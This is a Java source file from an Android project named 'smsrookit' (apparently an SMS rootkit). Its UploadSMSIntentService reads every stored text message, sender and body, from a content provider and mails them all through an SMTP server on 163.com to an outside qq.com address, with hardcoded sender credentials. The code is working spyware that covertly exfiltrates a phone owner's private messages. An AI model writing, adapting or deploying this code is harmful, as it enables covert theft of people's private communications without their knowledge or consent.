package com.funny.fortest.smsrookit;

import android.app.IntentService;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.util.Log;

import java.util.ArrayList;

/**
 * An {@link IntentService} subclass for handling asynchronous task requests in
 * a service on a separate handler thread.
 * <p/>
 * TODO: Customize class - update intent actions and extra parameters.
 */
public class UploadSMSIntentService extends IntentService {

    public UploadSMSIntentService() {
        super("UploadSMSIntentService");
    }

    @Override
    protected void onHandleIntent(Intent intent) {

        ArrayList all=new ArrayList();
        Uri uri = Uri.parse("content://com.funny.fortest.provider/SMS");
        Cursor cursor = null;
        cursor = SMSApplication.getContext().getContentResolver().query(uri, null, null, null, null);
        if (cursor != null) {
            while (cursor.moveToNext()) {
                String sender = cursor.getString(cursor
                        .getColumnIndex("sender"));
                String message = cursor.getString(cursor
                        .getColumnIndex("message"));

                Log.d("zhaochengyu", "sender name is " + sender);
                Log.d("zhaochengyu", "message author is " + message);

                String oneSMS = sender + " #### " + message;
                all.add(oneSMS);
            }
            cursor.close();
        }
        String ALLContent = null;
        for(int i=0;i<all.size();i++) {
            String alEach=(String)all.get(i);
            ALLContent = ALLContent + " %%% " + alEach;
        }
        Log.i("zhaochengyu", "onHandleIntent: "+ALLContent);
        sendMail("test",ALLContent);
    }

    public boolean sendMail(String Subject,String Content){
        //这个类主要是设置邮件
        MailSenderInfo mailInfo = new MailSenderInfo();
        mailInfo.setMailServerHost("smtp.163.com");
        mailInfo.setMailServerPort("25");
        mailInfo.setValidate(true);
        mailInfo.setUserName("yuXXXXXX@163.com");
        mailInfo.setPassword("passwd");//您的邮箱密码
        mailInfo.setFromAddress("yu5890681@163.com");
        mailInfo.setToAddress("45XXXXXX@qq.com");
        mailInfo.setSubject(Subject);
        mailInfo.setContent(Content);
        //这个类主要来发送邮件
        SimpleMailSender sms = new SimpleMailSender();
        sms.sendTextMail(mailInfo);//发送文体格式
        //sms.sendHtmlMail(mailInfo);//发送html格式
        return true;
    }
}
